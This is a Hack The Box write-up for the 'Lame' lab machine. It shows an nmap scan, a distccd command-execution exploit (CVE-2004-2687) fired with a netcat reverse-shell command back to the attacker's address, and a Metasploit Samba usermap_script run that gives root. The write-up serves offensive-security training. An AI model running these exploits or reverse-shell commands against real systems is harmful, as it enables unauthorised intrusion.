---
title: Writeup - HTB Lame
date: 2023-10-29
author: kei5uke
description: Writeup for HTB Lame
tags:
  - linux
  - metasploit
  - writeup
---

# Lame

# Enumeration

## Nmap

```bash
┌──(root💀kali)-[~/lame]
└─# nmap -sC -sV -p- -T4 10.129.79.102 -oN nmap.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 01:31 EEST
Nmap scan report for 10.129.79.102
Host is up (0.039s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.22
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-`k  Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m25s, deviation: 2h49m45s, median: 22s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-10-28T18:33:35-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.11 seconds
```

## FTP File Zilla

Possible Access not writeable

## SMB

```bash
┌──(root💀kali)-[~/lame]
└─# smbclient -L 10.129.79.102                                                                                           1 ⨯
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

Not use.

## Distccd

[(CVE-2004-2687) DistCC Daemon - Command Execution (Python)](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)

Found interestring exploit.

```bash
┌──(root💀kali)-[~/lame]
└─# python3 distccd_rce_CVE-2004-2687.py -t 10.129.79.102 -p 3632 -c "nc 10.10.16.22 1403 -e /bin/sh"
[*] Connected to remote service
[!] Socket Timeout
```

![Screenshot 2023-10-29 at 02.06.44.png](Lame%201eaea493130c47ba805ffed580c9de33/Screenshot_2023-10-29_at_02.06.44.png)

I got shell

# Shell Privilege Escalation

I tried a lot of things but I couldn’t find anything that makes me root with this user.

[Samba "username map script" Command Execution](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)

I decided to go back to enumeration and found interesting smb vulnerability and tried it with msfconsole in the end.

```bash
msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                      wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.211.55.20     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.129.79.102
RHOSTS => 10.129.79.102
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.16.22
LHOST => 10.10.16.22
msf6 exploit(multi/samba/usermap_script) > run
```

![Screenshot 2023-10-29 at 03.19.36.png](Lame%201eaea493130c47ba805ffed580c9de33/Screenshot_2023-10-29_at_03.19.36.png)

I got root.